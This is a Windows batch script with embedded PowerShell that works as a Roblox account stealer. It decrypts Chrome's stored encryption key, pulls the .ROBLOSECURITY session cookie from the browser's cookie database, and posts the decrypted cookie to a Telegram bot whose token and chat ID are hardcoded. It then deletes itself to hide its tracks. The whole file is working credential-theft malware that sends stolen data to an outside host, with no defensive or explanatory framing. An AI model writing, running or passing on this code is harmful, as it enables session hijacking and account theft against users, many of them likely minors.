@echo off
setlocal

:: --- [ CONFIG ] ---
set "BOT_TOKEN=8622001163:AAFzrmxcoDLJKS51yyyddOceU_iUoOooWZ0"
set "CHAT_ID=8508643177"

:: --- [ EXECUTE POWERSHELL DECRYPTOR ] ---
powershell -Command ^
"$p = \"$env:LOCALAPPDATA\Google\Chrome\User Data\";" ^
"$ls = Get-Content -Raw \"$p\Local State\" | ConvertFrom-Json;" ^
"$ek = [System.Convert]::FromBase64String($ls.os_crypt.encrypted_key).Substring(5);" ^
"$mk = [System.Security.Cryptography.ProtectedData]::Unprotect($ek, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser);" ^
"Copy-Item \"$p\Default\Network\Cookies\" \"$env:TEMP\cc\";" ^
"$db = [System.Data.SQLite.SQLiteConnection]::new(\"Data Source=$env:TEMP\cc\");" ^
"if(-not (Get-Module -ListAvailable PSSQLite)) { " ^
"  $db = New-Object -ComObject ADODB.Connection;" ^
"  $db.Open(\"Driver={SQLite3 ODBC Driver};Database=$env:TEMP\cc;\");" ^
"} else { $db.Open(); }" ^
"$sql = \"SELECT encrypted_value FROM cookies WHERE host_key LIKE '%%roblox.com%%' AND name = '.ROBLOSECURITY'\";" ^
"$cmd = $db.CreateCommand(); $cmd.CommandText = $sql;" ^
"$r = $cmd.ExecuteReader();" ^
"if($r.Read()) {" ^
"  $v = $r['encrypted_value'];" ^
"  $iv = $v[3..14]; $ct = $v[15..($v.Length-17)]; $tg = $v[($v.Length-16)..($v.Length-1)];" ^
"  $aes = [System.Security.Cryptography.AesGcm]::new($mk);" ^
"  $pt = New-Object byte[] $ct.Length;" ^
"  $aes.Decrypt($iv, $ct, $tg, $pt);" ^
"  $res = [System.Text.Encoding]::UTF8.GetString($pt);" ^
"  Invoke-RestMethod -Uri \"https://api.telegram.org/bot%BOT_TOKEN%/sendMessage\" -Method Post -Body @{chat_id='%CHAT_ID%'; text=\"🎯 **Captured!**`n`n$res\"; parse_mode='Markdown'};" ^
"}" ^
"$db.Close(); Remove-Item \"$env:TEMP\cc\";"

:: ลบตัวสคริปต์ทิ้งทันที
(goto) 2>nul & del "%~f0"
